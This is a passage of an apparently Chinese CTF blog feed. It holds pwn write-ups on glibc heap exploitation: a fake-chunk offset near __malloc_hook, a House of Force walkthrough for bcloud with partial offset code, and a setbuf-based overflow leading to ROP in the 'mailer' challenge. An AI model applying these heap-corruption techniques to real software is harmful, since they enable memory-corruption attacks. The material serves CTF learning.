<pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">int</span> iters <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>

        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>iters <span class="token operator">>=</span> MAX_ITERS<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 小循环最多1k次</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment" spellcheck="true">// 寻找largbin, 切大块, 用top....无数代码</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment" spellcheck="true">// 合并fastbin, 用sysmalloc</span>
    <span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><del>有没有大佬能解答我的问题, 私撩我好嘛</del> 问题解决..自己没好好读代码</p>
<blockquote>
<p>我的理解仿佛和大佬不一样, a, 我好菜啊</p>
<p>不过这个dalao的完整的exp在我这边跑不起来</p>
<p>以下是之前的记录 </p>
</blockquote>
<p>再说这个错位分配<code>fake_chunk</code>到<code>malloc_hook</code>附近的操作</p>
<p>我的环境是这样, 和ctf-wiki中介绍的一样, malloc_hook和realloc_hook挨着的, 和<code>main_arena</code>差一点</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>gx <span class="token number">0x7ffff7dd1b08</span>
<span class="token number">0x7ffff7dd1b08</span> <span class="token operator">&lt;</span>__realloc_hook<span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x00007ffff7a92a00</span>
gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>gx <span class="token number">0x7ffff7dd1b10</span>
<span class="token number">0x7ffff7dd1b10</span> <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>
gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>gx <span class="token number">0x7ffff7dd1b20</span>
<span class="token number">0x7ffff7dd1b20</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>同样的是在<code>0x7ffff7dd1af5</code>, 这个地方可以错位伪造一个<code>size</code></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token number">0x7ffff7dd1af5</span> <span class="token operator">&lt;</span>_IO_wide_data_0<span class="token operator">+</span><span class="token number">309</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x000000000000007f</span>    <span class="token number">0xfff7a92e20000000</span>
<span class="token number">0x7ffff7dd1b05</span> <span class="token operator">&lt;</span>__memalign_hook<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0xfff7a92a0000007f</span>    <span class="token number">0x000000000000007f</span>
<span class="token number">0x7ffff7dd1b15</span> <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>加上<code>prev_size</code>的8字节, 所以是要在<code>0x7ffff7dd1aed</code>处伪造一个chunk, 就是使得其他chunk的<code>fd</code>指向这里…</p>
<p>这个地方在我的环境里是距离<code>main_arena</code>距离为<code>0x7ffff7dd1b20 - 0x7ffff7dd1aed</code>, 所以<code>fake_chunk</code>地址是<code>main_arena - 0x33</code>, 这个<code>0x33</code>应该是出现在通过fake_chunk来更改<code>malloc_hook</code>的各种WP里…可以记住这值了<br>23333, 也有的人写<code>malloc_hook - 0x23</code>, 一样的</p>
<p>而且由于伪造的<code>size</code>是0x7f, 所以…在计算大小的时候, <code>fastbin_index(0x7f)</code>, 是属于fastbinY[5], 对应chunk大小是<code>0x70</code>, data部分是<code>0x60</code>的…所以要选择分配对应大小的块, 才可以</p>
<p>喔, That’ all.</p>
<h3 id="关于跳转表"><a href="#关于跳转表" class="headerlink" title="关于跳转表"></a>关于跳转表</h3><p>IDA里出现了这个内容…虽然算一下就OK, 但看着很不直观</p>
<pre class="line-numbers language-c"><code class="language-c">  <span class="token function">JUMPOUT</span><span class="token punctuation">(</span>__CS__<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dword_14F4 <span class="token operator">+</span> dword_14F4<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[house of force | bctf2016-bcloud]]></title>
      <url>/2018/07/04/house-of-force-bctf2016-bcloud/</url>
      <content type="html"><![CDATA[<p>show这个功能…没写, 空的…</p>
<p>意思是不能通过show来leak了…</p>
<p>仔细的观察了一下..在一开头输入name的这里, 可以leak出heap base..很神奇</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_80487A1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-5Ch]@1</span>
<span class="token operator">=</span><span class="token operator">></span>  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+5Ch] [bp-1Ch]@1</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+6Ch] [bp-Ch]@1</span>

  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__GS__<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">readn_until</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dword_804B0CC <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">;</span>
<span class="token operator">=</span><span class="token operator">></span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__GS__<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>漏洞的点在箭头指向的strcpy, 字符串复制是遇到<code>\x00</code>才停止…如果我们的name是64字节…那么就正好和<code>v2</code>的内容连起来了…所以会被一同复制到堆上…准确的说v2的内容(malloc返回的指针)应该是在topchunk的prev_size字段..但不重要…v2的内容也会在welcome的时候随name的内容一同输出, 我们就得到了<code>heap_base</code></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 0x08c16008就是我们要leak出来的, 0x00020f00是topchunk的size字段了</span>
gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>30x <span class="token number">0x8c16008</span>
<span class="token number">0x8c16008</span><span class="token punctuation">:</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>
<span class="token number">0x8c16018</span><span class="token punctuation">:</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>
<span class="token number">0x8c16028</span><span class="token punctuation">:</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>
<span class="token number">0x8c16038</span><span class="token punctuation">:</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>    <span class="token number">0x61616161</span>
<span class="token number">0x8c16048</span><span class="token punctuation">:</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">0x08c16008</span>    <span class="token number">0x00020f00</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在设置org和host的函数里有相同的问题, 妙啊</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_804884E</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token operator">+</span><span class="token operator">-</span> <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-9Ch]@1</span>
<span class="token operator">|</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+5Ch] [bp-5Ch]@1</span>
<span class="token operator">+</span><span class="token operator">-</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+60h] [bp-58h]@1</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+A4h] [bp-14h]@1</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+ACh] [bp-Ch]@1</span>

  v5 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__GS__<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Org:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">=</span><span class="token operator">></span>  <span class="token function">readn_until</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Host:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">readn_until</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">=</span><span class="token operator">></span>  v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  org <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v2<span class="token punctuation">;</span>
  host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OKay! Enjoy:)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__GS__<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里, org如果输入一个64字节的字符串, 就会把s(org_buf), v2(org_ptr), v3(org_buf), 都一并复制到了堆上, 这个时候v2是和topchunk相邻的, 所以和上面输入name的时候情况相同<br>这里v2的内容被放在topchunk的prev_size, v3的前4字节会覆盖topchunk的size, 后面的内容会覆盖topchunk的data</p>
<p>所以现在我们能够</p>
<ol>
<li>leak出heapbase</li>
<li>控制topchunk的size</li>
</ol>
<p>而且观察到新建note的时候对note的content大小无限制, 就是可以申请任意大小的堆块</p>
<p>有上面三个条件, 就可以控制topchunk指针的走向, 从而在任意地址分配内存块</p>
<p>就是House of Force</p>
<p>具体控制的流程一般资料都有</p>
<p>第一步, 更改topchunk的size到很大, 比如-1, 在32位下兑换成无符号数就是0xffffffff<br>在本题中就是</p>
<pre class="line-numbers language-python"><code class="language-python">org <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">64</span>
host <span class="token operator">=</span> <span class="token string">'\xff'</span> <span class="token operator">*</span> <span class="token number">4</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>第二步, 计算我们想要申请的地址距离topchunk的偏移, 申请对应偏移大小的堆块</p>
<pre class="line-numbers language-python"><code class="language-python">heap_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">8</span> <span class="token comment" spellcheck="true"># 我们在最开始leak出来的heap_base</span>
addr_topchunk <span class="token operator">=</span> heapbase <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x48</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 算出来现在的topchunk位置</span>
addr_we_want <span class="token operator">=</span> <span class="token comment" spellcheck="true"># 我们想要任意地址写的地方, 这是data部分, 所以等会算的时候要减去头部的8字节</span>
off <span class="token operator">=</span> <span class="token punctuation">(</span>addr_we_want <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> addr_topchunk
<span class="token comment" spellcheck="true"># 之后还要对齐之类的,而且这题是malloc(size+4), 这些还要算到offset里, 这里不继续算下去了, 之后直接放payload</span>
off_final_size <span class="token operator">=</span> off <span class="token operator">+</span> balabala
newNote<span class="token punctuation">(</span>off_final_size<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这一步之后, topchunk指针就偏移了off, 到了我们想要的特定位置</p>
<p>第三步, 这次再newnote得到的chunk就是我们想要的地址了, 写入内容就OK了</p>
<p>payload之后贴上来</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FUZZ | AFL简单尝试]]></title>
      <url>/2018/07/04/FUZZ-AFL%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[符号执行入门 | Manticore angr]]></title>
      <url>/2018/07/04/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%85%A5%E9%97%A8-Manticore-angr/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[c | 输入输出学习]]></title>
      <url>/2018/07/04/c-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>刚做题才发现…<code>scanf(&quot;%s&quot;, buf)</code>不能接收空格…</p>
<p>我得顺便把这些总结一下…特别是格式化字符串里, 自己有的时候就不太明白</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> c </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[setbuf | mailer]]></title>
      <url>/2018/07/03/setbuf-mailer/</url>
      <content type="html"><![CDATA[<p>code_blue CTF 2017 的一道题目, 名字叫mailer, 和setbuf有关的<br>本来想复现一道堆的, 算了, 先把这个复现一下<br>结构体大概是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> mailer<span class="token punctuation">{</span>
    <span class="token keyword">int</span> flag1<span class="token punctuation">;</span>
    <span class="token keyword">int</span> flag2<span class="token punctuation">;</span>
    <span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 0x100 == 256</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大致功能如下</p>
<pre class="line-numbers language-python"><code class="language-python">
<span class="token operator">**</span><span class="token operator">*</span> Secret Mailer Service <span class="token operator">**</span><span class="token operator">*</span>
Welcome to Secret Mailer Service!
Post your secret letters here <span class="token punctuation">;</span><span class="token punctuation">)</span>

<span class="token number">1</span><span class="token punctuation">.</span> Add a letter
<span class="token number">2</span><span class="token punctuation">.</span> Delete a letter
<span class="token number">3</span><span class="token punctuation">.</span> Post a letter
<span class="token number">4</span><span class="token punctuation">.</span> Quit
<span class="token operator">></span> <span class="token number">1</span>

Input your contents<span class="token punctuation">:</span> <span class="token number">222</span>

Done!

<span class="token number">1</span><span class="token punctuation">.</span> Add a letter
<span class="token number">2</span><span class="token punctuation">.</span> Delete a letter
<span class="token number">3</span><span class="token punctuation">.</span> Post a letter
<span class="token number">4</span><span class="token punctuation">.</span> Quit
<span class="token operator">></span> <span class="token number">3</span>

Which letter do you want to post?
ID <span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">0</span>

Which filter do you want to apply?
<span class="token number">0</span><span class="token punctuation">.</span> No filter
<span class="token number">1</span><span class="token punctuation">.</span> XOR filter
<span class="token number">2</span><span class="token punctuation">.</span> Reverse filter
<span class="token operator">></span> <span class="token number">0</span>

Done!
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>仔细看过么有发现什么明显的洞…</p>
<p>又读了一遍, 发现在 <code>post letter</code>这个略显多余的功能里可以选择调用的函数…</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">post_m</span><span class="token punctuation">(</span>mailer <span class="token operator">*</span>a1<span class="token punctuation">,</span> FILE <span class="token operator">*</span>s<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax@4</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+8h] [bp-10h]@5</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Ch] [bp-Ch]@1</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nWhich letter do you want to post?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ID (0-%d): "</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token function">getn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">&lt;=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">.</span>flag1 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nWhich filter do you want to apply?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_80488F8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> <span class="token function">getn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
<span class="token operator">=</span><span class="token operator">></span>      off_804B048<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> a1<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">.</span>content<span class="token punctuation">,</span> a1<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">.</span>flag2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid filter."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid ID."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>洞在我指向的这个地方, 这里只判断<code>getn() &lt;=2</code>, 如果输入一个负数, 那么就能调用到<code>0x804b048</code>之前的函数了, 但…我们不能控制参数</p>
<p>因为参考了大佬的做法…所以这里就是问题的关键, 这个如果调用一个<code>setbuf</code>函数<br>就是…把某个mailers的content设为stream的缓冲区</p>
<pre class="line-numbers language-c"><code class="language-c">stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setbuf</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> mailers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>只要使用库函数往流<code>stream</code>写入数据, 就会写入<code>stream</code>的缓冲区<code>mailers[i].content</code></p>
<p>而我们在<code>sub_8048742</code>里</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token function">fwrite</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> stream<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以将<code>buf</code>中的内容写到<code>stream</code></p>
<p>所以只要两个<code>mailer</code>配合<br>先在<code>mailers[1]</code>里写入适当内容<br>然后post一次<code>mailers[0]</code>, 输入一个负值, 调用<code>setbuf</code> (setbuf的offset是-15)<br>然后再post一次<code>mailers[1]</code>, 选择<code>no_filter</code>, 调用<code>fwrite</code><br>就可以把<code>mailers[1].content</code>的内容写到<code>mailers[0].content</code>, 然后溢出就可以, 写ROP了</p>
<pre class="line-numbers language-python"><code class="language-python">buf1 <span class="token operator">-</span><span class="token operator">></span> stream <span class="token operator">-</span><span class="token operator">></span> buf0
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>mdzz…昨晚的idb没存….气的吐血</p>
<p>那就不写poc了, 2233333</p>
<p>需要注意的点,</p>
<ol>
<li>为了溢出的方便, 我们把stream和最后一个mailers绑定起来, 这样子, 只要往stream写两次就能够溢出了, 第一次填充, 第二次写payload…因为每个mailer的content大小是相等的,所以至少要两次才OK</li>
</ol>
<p>所以我们要add 5个mailer, 在<code>mailers[0..3]</code>的某一个中写入ROP链, 为了叙述方便, 我们不妨假设写到了<code>mailers[0]</code>, 然后<code>post(mailers[4], -15)</code>, 就用setbuf把最后一个mailer和stream绑定起来了, 之后, <code>post(mailers[1], 0)</code>, 写入一次padding, 再<code>post(mailers[0], 0)</code>, 写入ROP链, 就OK了</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 复现 </tag>
            
            <tag> setbuf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[builtin-expect]]></title>
      <url>/2018/06/28/builtin-expect/</url>
      <content type="html"><![CDATA[<p>开始yy错了, 在glibc里</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token function">__libc_malloc</span> <span class="token punctuation">(</span>size_t bytes<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    mstate ar_ptr<span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>victim<span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atomic_forced_read</span> <span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
